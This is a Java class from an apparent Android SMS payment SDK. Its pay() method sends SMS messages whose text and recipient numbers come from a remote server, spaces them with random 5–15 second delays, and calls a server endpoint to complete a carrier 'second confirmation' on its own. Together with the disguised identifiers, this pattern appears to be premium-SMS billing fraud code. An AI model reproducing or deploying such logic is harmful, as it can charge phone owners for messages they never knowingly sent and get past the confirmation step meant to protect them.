package com.y7.smspay.sdk.channel;

import android.text.TextUtils;

import com.y7.smspay.sdk.json.ChannelEntity;
import com.y7.smspay.sdk.ss.ISdMsgLs;
import com.y7.smspay.sdk.ss.SdMsg;
import com.y7.smspay.sdk.ss.SsParse;
import com.y7.smspay.sdk.util.HttpSdSsTool;
import com.y7.smspay.sdk.util.StrUtils;
import com.y7.smspay.sdk.util.Utils;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.net.URLDecoder;
import java.util.Random;

public class DefaultPoyChannel extends BasePoyChannel {
	// private String payType;
	private String payCode;
	private String channelTelnumber;
	private String cid; // 指令ID
	private String number = ""; // 第几条短信
	private String throughId;
	private String sourceCode;
	private ChannelEntity channel;
	private static boolean isSend = true;

	private int sendport2 = 0;
	private int sendType = 0;
	
	private final boolean isBase64 = true;

	@Override
	public void pay() {
		super.pay();
		//DDDLog.i("DefaultPayChannel begin");
		String order = channel.order;

		JSONArray bodys = null;
		try {
			bodys = new JSONArray(order);
			//DDDLog.d("channel.order --> " + channel.order);
			//DDDLog.d("bodys -->" + bodys.toString());
		} catch (JSONException e) {
			//DDDLog.e("pay json", e);
		}
		if (bodys == null || bodys.length() <= 0) {
			//DDDLog.i("返回通道为空！！！！！");
			postPayFailedEvent();
			return;
		}
		for (int i = 0; i < bodys.length(); i++) {
			try {
				JSONObject body = bodys.getJSONObject(i);
				//DDDLog.d("**********************************************");
				//DDDLog.d("command -->"+ URLDecoder.decode(body.get("command").toString(),"UTF-8"));
				//DDDLog.d("**********************************************");

				// "sendType":"2"
				// 使用字符串截取的方式读取端口和指令,避免特殊字符无法解析的问题
				// String[] cd = body.toString().split("command\":\"");
				// String[] comd = cd[1].split("\",\"sendport\":\"");
				// payCode = comd[0];
				// 使用URL编码解决传输过程中自动转义的问题
				payCode = URLDecoder.decode(body.get("command").toString(),
						"UTF-8");
				channelTelnumber = body.get("sendport").toString();

				price = Integer.parseInt(body.getString("price"));
				cid = body.getString("cid");
				number = body.getString("number");

				sendType = body.isNull("sendType") ? 0 : body
						.getInt("sendType");
				sendport2 = body.isNull("sendport2") ? 0 : body
						.getInt("sendport2");
			} catch (Exception e1) {
				//DDDLog.e("pay", e1);
			}

			//DDDLog.d("payMessage.send -->" + channelTelnumber + "," + payCode);
			if (TextUtils.isEmpty(channelTelnumber)
					|| TextUtils.isEmpty(payCode)) {
				postPayFailedEvent();
				return;
			}
			new SdMsg(isBase64,sendType,sendport2,appContext, channelTelnumber, payCode, price,
					Integer.parseInt(throughId), getOrderInfo().did,
					getOrderInfo().serParam, new ISdMsgLs() {
						@Override
						public void onSendSucceed() {
							//DDDLog.d("DefaultPayChannel end: PayState_SUCCESS");
							//DDDLog.d("secondType --->: " + SsParse.secondType);
							//DDDLog.d("number --->: " + number);

							// postPaySucceededEvent();
							if (!TextUtils.isEmpty(SsParse.secondType)) {
								if (SsParse.secondType.startsWith("5")) {// 二次
									//DDDLog.e("secondType --->:111 ");
									doSourceCode();
								}
								//DDDLog.e("secondType --->:222 ");
							}

							if (number.equals("1")) {
								//DDDLog.e("secondType --->:333 ");
								postPaySucceededEvent();
							}
						}

						@Override
						public void onSendFailed() {
							//DDDLog.d("DefaultPayChannel end: PayState_FAILURE");
							if (number.equals("1")) {
								postPayFailedEvent();
							}
						}
					});

			Random rand = new Random();
			int randNum = rand.nextInt(10000) + 5000;
			//DDDLog.i("randNum-->" + randNum);
			try {
				Thread.sleep(randNum);
			} catch (InterruptedException e) {
				//DDDLog.e("Exception", e);
			}
		}
	}

	public String getThroughId() {
		return throughId;
	}

	public void setThroughId(String throughId) {
		this.throughId = throughId;
	}

	public ChannelEntity getChannel() {
		return channel;
	}

	public void setChannel(ChannelEntity channel) {
		this.channel = channel;
	}

	public String getSourceCode() {
		return sourceCode;
	}

	public void setSourceCode(String sourceCode) {
		this.sourceCode = sourceCode;
	}

	private void doSourceCode() {
		//DDDLog.e("doSourceCode");

		String httpUrl = StrUtils.SERVER_URL
				+ "/gwzoo/pinterface/PhoneAPIAction!smsReqTwo";
		String endUrl = httpUrl + "?" + HttpSdSsTool.YDSQStr + "&price="
				+ price + "&netType=" + Utils.netType;

		if (!TextUtils.isEmpty(this.sourceCode) && this.sourceCode.length() > 3) {
			String tmp = this.sourceCode.toLowerCase().trim();
			if (tmp.startsWith("abc")) {
				//DDDLog.e("abc");

				HttpSdSsTool.callBackPost(appContext, endUrl);
				return;
			} else {
				//DDDLog.e("abc 1");
			}
		}
		//DDDLog.e("abc 2");
		HttpSdSsTool.callSedCore(appContext, Integer.parseInt(throughId),
				getOrderInfo().did, getOrderInfo().serParam, endUrl);
	}
}
